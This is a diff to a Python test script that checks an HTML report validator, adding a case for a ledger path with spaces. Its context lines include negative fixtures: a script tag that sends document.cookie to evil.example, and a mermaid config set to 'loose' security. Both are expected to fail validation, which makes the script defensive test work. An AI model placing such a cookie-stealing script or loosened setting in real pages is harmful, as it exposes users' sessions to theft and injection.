@@ -74,6 +74,10 @@ def main():
         ledger = os.path.join(tmp, "run.ledger.md")
         with open(ledger, "w") as fh:
             fh.write("# ledger\n")
+        spaced = os.path.join(tmp, "run dir", "my run.ledger.md")
+        os.makedirs(os.path.dirname(spaced), exist_ok=True)
+        with open(spaced, "w") as fh:
+            fh.write("# ledger\n")
 
         cases = [
             ("good", report(["src/app.py", "src/db.py"], "move logic into lib/orders.py", ledger=ledger), 0),
@@ -88,6 +92,8 @@ def main():
                 "</head>", '<script>fetch("https://evil.example/" + document.cookie)</script></head>'), 1),
             ("loose-security", report(["src/app.py", "src/db.py"], "consolidate", ledger=ledger).replace(
                 "esm.min.mjs\";", 'esm.min.mjs"; mermaid.initialize({ securityLevel: "loose" });'), 1),
+            ("spaced-ledger", report(["src/app.py", "src/db.py"], "consolidate",
+                                     ledger=os.path.join(tmp, "run dir", "my run.ledger.md")), 0),
         ]
         for name, body, want in cases:
             path = os.path.join(tmp, f"{name}.html")
